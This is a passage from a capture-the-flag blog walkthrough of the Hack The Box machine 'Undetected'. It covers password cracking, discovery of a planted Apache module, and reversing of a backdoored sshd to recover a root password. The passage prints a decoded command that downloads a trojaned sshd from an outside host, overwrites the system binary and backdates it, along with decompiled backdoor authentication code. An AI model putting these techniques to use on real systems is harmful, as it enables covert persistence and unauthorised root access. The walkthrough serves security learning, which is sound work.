Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5000</span> <span style="color:#66d9ef">for</span> all loaded hashes
Will run <span style="color:#ae81ff">8</span> OpenMP threads
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
ihatehackers     <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
1g 0:00:00:27 DONE <span style="color:#f92672">(</span>2022-07-07 07:19<span style="color:#f92672">)</span> 0.03696g/s 3293p/s 3293c/s 3293C/s littlebird..hairy
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div><p>well, the password is <code>ihatehackers</code> let&rsquo;s get a shell!</p>
<p>the password will work for <code>steven1</code> since they have the same UID, it will give a shell as steven, this is the concept of that binary file attack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@production:/var/backups$ su steven1
Password: ihatehackers
steven@production:/var/backups$ 
</code></pre></div><p>we also can get a ssh shell.</p>
<h2 id="shell-as-root--pe">
  Shell as root | PE
  <a href="#shell-as-root--pe" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>There is mail in <code>/var/mail/steven</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">steven@production:~$ cat /var/mail/steven 
From root@production  Sun, <span style="color:#ae81ff">25</span> Jul <span style="color:#ae81ff">2021</span> 10:31:12 GMT
Return-Path: &lt;root@production&gt;
Received: from production <span style="color:#f92672">(</span>localhost <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">])</span>
	by production <span style="color:#f92672">(</span>8.15.2/8.15.2/Debian-18<span style="color:#f92672">)</span> with ESMTP id 80FAcdZ171847
	<span style="color:#66d9ef">for</span> &lt;steven@production&gt;; Sun, <span style="color:#ae81ff">25</span> Jul <span style="color:#ae81ff">2021</span> 10:31:12 GMT
Received: <span style="color:#f92672">(</span>from root@localhost<span style="color:#f92672">)</span>
	by production <span style="color:#f92672">(</span>8.15.2/8.15.2/Submit<span style="color:#f92672">)</span> id 80FAcdZ171847;
	Sun, <span style="color:#ae81ff">25</span> Jul <span style="color:#ae81ff">2021</span> 10:31:12 GMT
Date: Sun, <span style="color:#ae81ff">25</span> Jul <span style="color:#ae81ff">2021</span> 10:31:12 GMT
Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If <span style="color:#66d9ef">for</span> any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password <span style="color:#66d9ef">for</span> you to authenticate to the temporary server.

Thanks,
sysadmin
steven@production:~$
</code></pre></div><p>we can look for files that created around the <code>info</code> file date. 14 May 2021</p>
<pre tabindex="0"><code>steven@production:/var/backups$ ls -l info
-r-x------ 1 www-data www-data 27296 May 14  2021 info
steven@production:/var/backups$
</code></pre><p>I filtered the <code>/usr/share</code> path because it has none interesting bunch of files.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">steven@production:~$ find / -newermt 2021-05-14 ! -newermt 2021-05-20 -ls 2&gt;/dev/null | grep -v <span style="color:#e6db74">&#34;/usr/share&#34;</span>
      <span style="color:#ae81ff">198</span>   <span style="color:#ae81ff">1264</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root      <span style="color:#ae81ff">1293928</span> May <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> /usr/lib/x86_64-linux-gnu/libX11.so.6.3.0
      <span style="color:#ae81ff">383</span>      <span style="color:#ae81ff">0</span> lrwxrwxrwx   <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">15</span> May <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> /usr/lib/x86_64-linux-gnu/libX11.so.6 -&gt; libX11.so.6.3.0
     <span style="color:#ae81ff">2050</span>     <span style="color:#ae81ff">36</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">34800</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2021</span> /usr/lib/apache2/modules/mod_reader.so
    <span style="color:#ae81ff">17565</span>     <span style="color:#ae81ff">28</span> -r-x------   <span style="color:#ae81ff">1</span> www-data www-data    <span style="color:#ae81ff">27296</span> May <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2021</span> /var/backups/info
   <span style="color:#ae81ff">136479</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">73</span> May <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> /var/lib/dpkg/info/libx11-6:amd64.triggers
   <span style="color:#ae81ff">135874</span>     <span style="color:#ae81ff">16</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">14532</span> May <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> /var/lib/dpkg/info/libx11-data.md5sums
   <span style="color:#ae81ff">141686</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">43</span> May <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2021</span> /var/lib/dpkg/info/update-notifier-common.triggers
   <span style="color:#ae81ff">136056</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">73</span> May <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> /var/lib/dpkg/info/libx11-6:amd64.shlibs
   <span style="color:#ae81ff">136215</span>     <span style="color:#ae81ff">32</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">32605</span> May <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> /var/lib/dpkg/info/libx11-6:amd64.symbols
   <span style="color:#ae81ff">136055</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">427</span> May <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> /var/lib/dpkg/info/libx11-6:amd64.md5sums
    <span style="color:#ae81ff">50834</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">69</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2021</span> /etc/apache2/mods-available/reader.load
    <span style="color:#ae81ff">50832</span>      <span style="color:#ae81ff">0</span> lrwxrwxrwx   <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">29</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2021</span> /etc/apache2/mods-enabled/reader.load -&gt; ../mods-available/reader.load
</code></pre></div><p>The file in <code>/etc/apache2/mods-available</code> aims back to the <code>mod_reader.so</code> that also modified on 17 may.
I&rsquo;ll copy it into my machine for analysing it</p>
<p><code>strings</code> also helps this time no need to use a decompiler lol,</p>
<p>just take a quick look at the results you&rsquo;ll see a familiar base64</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch root<span style="color:#f92672">]</span>$ strings mod_reader.so
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[]</span>A<span style="color:#ae81ff">\A</span><span style="color:#f92672">]</span>
D<span style="color:#66d9ef">$(</span><span style="color:#ae81ff">1</span>
D<span style="color:#66d9ef">$(</span>dH+
reader
/bin/bash
mod_reader.c
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
;*3$<span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
</span><span style="color:#e6db74">42PA
</span><span style="color:#e6db74">GCC: (Debian 10.2.1-6) 10.2.1 20210110
</span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch root<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#39;d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk&#39;</span> | base64 -d
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d <span style="color:#e6db74">`</span>date +%Y-%m-%d -r /usr/sbin/a2enmod<span style="color:#e6db74">`</span> /usr/sbin/sshd
</code></pre></div><p>So It’s getting a sshd binary let&rsquo;s pull a copy as well.</p>
<p>I&rsquo;ll use <a href="https://github.com/NationalSecurityAgency/ghidra" target="_blank">ghidra</a>
 for reversing the binary</p>
<p>if we look at the exports functions we see a lot of function that start with <code>auth_</code></p>
<p><img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/undetected/img/auth_functions.png" style="border-radius: 3%;" alt="">
The <code>auth_password</code> function seems a good place to start with. let&rsquo;s take a look.</p>
<p>There’s a variable called backdoor, checking the official source code for that function <a href="https://github.com/openssh/openssh-portable/blob/master/auth-passwd.c" target="_blank">here</a>
 we can see that has been changed.</p>
<p>I won&rsquo;t go in to the details of it work in short:
the variable is createdwith 31 bytes, then hex values in little endian format are stored in it and then XORed by <code>0x96</code> key length, Then the password is compared to that value, and if so the return value is set to one, and the rest of the function is skipped.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">auth_password</span>(ssh <span style="color:#f92672">*</span>ssh,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password)

{
  Authctxt <span style="color:#f92672">*</span>ctxt;
  passwd <span style="color:#f92672">*</span>ppVar1;
  <span style="color:#66d9ef">int</span> iVar2;
  uint uVar3;
  byte <span style="color:#f92672">*</span>pbVar4;
  byte <span style="color:#f92672">*</span>pbVar5;
  size_t sVar6;
  byte bVar7;
  <span style="color:#66d9ef">int</span> iVar8;
  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
  <span style="color:#66d9ef">char</span> backdoor [<span style="color:#ae81ff">31</span>];
  byte local_39 [<span style="color:#ae81ff">9</span>];
  <span style="color:#66d9ef">long</span> local_30;
  
  bVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd6</span>;
  ctxt <span style="color:#f92672">=</span> (Authctxt <span style="color:#f92672">*</span>)ssh<span style="color:#f92672">-&gt;</span>authctxt;
  local_30 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
  backdoor._28_2_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa9f4</span>;
  ppVar1 <span style="color:#f92672">=</span> ctxt<span style="color:#f92672">-&gt;</span>pw;
  iVar8 <span style="color:#f92672">=</span> ctxt<span style="color:#f92672">-&gt;</span>valid;
  backdoor._24_4_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xbcf0b5e3</span>;
  backdoor._16_8_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb2d6f4a0fda0b3d6</span>;
  backdoor[<span style="color:#ae81ff">30</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x5b</span>;
  backdoor._0_4_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf0e7abd6</span>;
  backdoor._4_4_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa4b3a3f3</span>;
  backdoor._8_4_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf7bbfdc8</span>;
  backdoor._12_4_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfdb3d6e7</span>;
  pbVar4 <span style="color:#f92672">=</span> (byte <span style="color:#f92672">*</span>)backdoor;
  <span style="color:#66d9ef">while</span>( true ) {
    pbVar5 <span style="color:#f92672">=</span> pbVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
    <span style="color:#f92672">*</span>pbVar4 <span style="color:#f92672">=</span> bVar7 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x96</span>;
    <span style="color:#66d9ef">if</span> (pbVar5 <span style="color:#f92672">==</span> local_39) <span style="color:#66d9ef">break</span>;
    bVar7 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar5;
    pbVar4 <span style="color:#f92672">=</span> pbVar5;
  }
  iVar2 <span style="color:#f92672">=</span> strcmp(password,backdoor);
  uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
  <span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
    sVar6 <span style="color:#f92672">=</span> strlen(password);
    uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">if</span> (sVar6 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x401</span>) {
      <span style="color:#66d9ef">if</span> ((ppVar1<span style="color:#f92672">-&gt;</span>pw_uid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (options.permit_root_login <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>)) {
        iVar8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
      }
      <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>password <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>) <span style="color:#f92672">||</span>
         (uVar3 <span style="color:#f92672">=</span> options.permit_empty_passwd, options.permit_empty_passwd <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) {
        <span style="color:#66d9ef">if</span> (auth_password<span style="color:#f92672">::</span>expire_checked <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
          auth_password<span style="color:#f92672">::</span>expire_checked <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
          iVar2 <span style="color:#f92672">=</span> auth_shadow_pwexpired(ctxt);
          <span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
            ctxt<span style="color:#f92672">-&gt;</span>force_pwchange <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
          }
        }
        iVar2 <span style="color:#f92672">=</span> sys_auth_passwd(ssh,password);
        <span style="color:#66d9ef">if</span> (ctxt<span style="color:#f92672">-&gt;</span>force_pwchange <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
          auth_restrict_session(ssh);
        }
        uVar3 <span style="color:#f92672">=</span> (uint)(iVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> iVar8 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>);
      }
    }
  }
  <span style="color:#66d9ef">if</span> (local_30 <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
    <span style="color:#66d9ef">return</span> uVar3;
  }
                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
  __stack_chk_fail();
}
</code></pre></div><h3 id="decoding-root-password">
  Decoding root password
  <a href="#decoding-root-password" class="h-anchor" aria-hidden="true">#</a>
</h3>
<blockquote>
<p>A note, backdoor[30] is an invalid value of -0x5b, if you right click it in Ghidra you’ll see the correct value is 0xa5.</p>
</blockquote>
<p>we need to decode the password that held by the backdoor variable, we can use a simple python loop script or even easier with <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a>
</p>
<p><img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/undetected/img/pwd_decode.png" style="border-radius: 3%;" alt="">
So just like the function we’ve taken the values of backdoor, then converted from Little Endian to Hex and then XOR’d it. The result is the root password.</p>
<p>template: <a href="https://gchq.github.io/CyberChef/#recipe=Swap_endianness%28%27Hex%27,31,true%29From_Hex%28%27Auto%27%29XOR%28%7B%27option%27:%27Hex%27,%27string%27:%2796%27%7D,%27Standard%27,false%29&amp;input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg" target="_blank">gchq</a>
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>werz@Arch root<span style="color:#f92672">]</span>$ ssh root@10.10.11.146
root@10.10.11.146<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Last login: Thu Jul  <span style="color:#ae81ff">7</span> 08:48:09 <span style="color:#ae81ff">2022</span> from 10.10.14.9
root@production:~# 
</code></pre></div><p>We are in!</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://werz.info/blog/26/03/2022/timelapse/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Timelapse -- HTB walkthrough</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://werz.info/blog/12/02/2022/acute/">
                  <span class="button__text">Acute -- HTB walkthrough</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">© 2022 Powered by Hugo</div>
      
  </div>
</footer>

<script src="https://werz.info/blog/assets/main.js"></script>
<script src="https://werz.info/blog/assets/prism.js"></script>


      
    </div>

    
      
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
}
</script>

    
  </body>
</html>
